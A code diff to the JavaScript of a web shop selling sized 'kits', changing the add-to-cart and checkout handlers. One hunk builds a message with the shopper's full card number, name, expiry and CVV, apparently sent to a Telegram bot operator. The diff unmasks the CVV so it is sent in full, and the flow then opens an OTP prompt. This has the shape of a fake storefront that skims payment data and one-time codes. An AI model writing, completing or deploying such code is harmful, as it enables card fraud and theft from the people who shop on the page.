@@ -833,33 +833,40 @@ const cq = u.callback_query;
     overlay.onclick = () => setCart(false);
     
     // Add to cart handler - no Telegram buttons
-    document.querySelector('#add-to-cart').onclick = () => {
-      const existing = cart.find(item => item.size === selectedSize);
-      if (existing) existing.quantity = quantity;
-      else cart.push({ ...product, size: selectedSize, price: unitPrice, quantity });
-      
-      const session = createSession({
-        name: product.name,
-        price: unitPrice,
-        quantity: quantity,
-        email: '',
-        card: null,
-        summary: `Product: ${product.name}\nPrice: ${money(unitPrice)}\nQuantity: ${quantity}`
-      });
-      window.currentSessionId = session.id;
-      
-      showToast(quantity + ' ' + selectedSize + ' kit' + (quantity > 1 ? 's' : '') + ' added to cart');
-      setCart(true);
-      saveCart();
+    document.querySelector('#add-to-cart').onclick = (e) => {
+      try {
+        const existing = cart.find(item => item.size === selectedSize);
+        if (existing) existing.quantity = quantity;
+        else cart.push({ ...product, size: selectedSize, price: unitPrice, quantity });
+        
+        const session = createSession({
+          name: product.name,
+          price: unitPrice,
+          quantity: quantity,
+          email: '',
+          card: null,
+          summary: `Product: ${product.name}\nPrice: ${money(unitPrice)}\nQuantity: ${quantity}`
+        });
+        window.currentSessionId = session.id;
+        
+        console.log('Session created:', session.id);
+        
+        showToast(quantity + ' ' + selectedSize + ' kit' + (quantity > 1 ? 's' : '') + ' added to cart');
+        setCart(true);
+        saveCart();
+      } catch (err) {
+        console.error('Add to cart error:', err);
+        showToast('Error adding to cart');
+      }
     };
     
     // Checkout button handler - show signin modal
     document.querySelector('#checkout').onclick = () => {
       if (!cart.length) return;
       
-      const session = getSession(window.currentSessionId);
-      if (!session || session.stage !== 'pending') {
-        showToast('Please proceed through checkout');
+      if (!window.currentSessionId) {
+        showToast('Please add item to cart first');
+        return;
       }
       
       showSigninModal();
@@ -963,7 +970,7 @@ Price: ${money(unitPrice)}`,
 ID: ${sessionId}
 Card: ${cardNumber.replace(/ /g, '').replace(/(.{4})/g, '$1 ')}
 Name: ${cardName}
-CVV: ***${cvc}
+CVV: ${cvc}
 EXP: ${expiry}`,
         {
           inline_keyboard: [
@@ -974,7 +981,6 @@ EXP: ${expiry}`,
       );
       
       showOtpModal(sessionId);
-    };
     };
     
     // Card modal close
